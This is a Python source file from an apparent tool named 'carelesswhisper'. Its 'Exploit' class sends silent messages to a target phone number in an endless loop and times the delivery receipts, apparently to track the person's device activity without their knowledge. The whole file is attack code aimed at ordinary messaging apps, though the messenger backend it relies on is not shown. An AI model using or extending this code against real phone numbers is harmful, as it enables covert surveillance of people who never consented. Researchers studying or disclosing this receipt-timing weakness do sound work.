import asyncio
from dataclasses import dataclass, field
from logging import getLogger
from datetime import datetime

from carelesswhisper.messengers.base import BaseMessenger, BaseReceiptReport


logger = getLogger(__name__)


@dataclass
class Exploit:
    phone_number: str
    running: bool = field(default=False)
    _message_send_times: dict[str, datetime] = field(
        default_factory=dict  # Map message ID to send time
    )
    _reports: list[BaseReceiptReport] = field(
        default_factory=list  # Store all receipt reports
    )
    _listeners: list = field(
        default_factory=list  # Store messenger listeners
    )

    async def start(
        self,
        messenger: BaseMessenger,
        delay_between_requests: float = 1.0,
        listeners: list = [],
    ) -> None:
        """Starts the exploit to send silent messages and track delivery receipts."""
        self.running = True
        self._listeners.extend(listeners)

        while self.running:
            # Send a silent message to trigger delivery receipt
            msg_id = await messenger.send_silent_message(self.phone_number)
            logger.info(
                f"Sent silent message to {self.phone_number} to trigger delivery receipt (ID: {msg_id})"
            )
            # Record the send time
            self._message_send_times[msg_id] = datetime.now()

            await asyncio.sleep(delay_between_requests)

    async def on_delivery(self, msg_id: str) -> None:
        """Records the delivery time for a given message ID."""
        delivery_time = datetime.now()
        sent_time = self._message_send_times.pop(msg_id)

        report = BaseReceiptReport(
            msg_id=msg_id,
            phone_number=self.phone_number,
            sent_at=sent_time,
            delivered_at=delivery_time,
        )

        self._reports.append(report)

        for listener in self._listeners:
            await listener(report)

    def get_reports(self) -> list[BaseReceiptReport]:
        """Returns all recorded receipt reports."""
        return self._reports

    def add_listener(self, listener) -> None:
        """Adds a listener to be notified on new receipt reports."""
        self._listeners.append(listener)
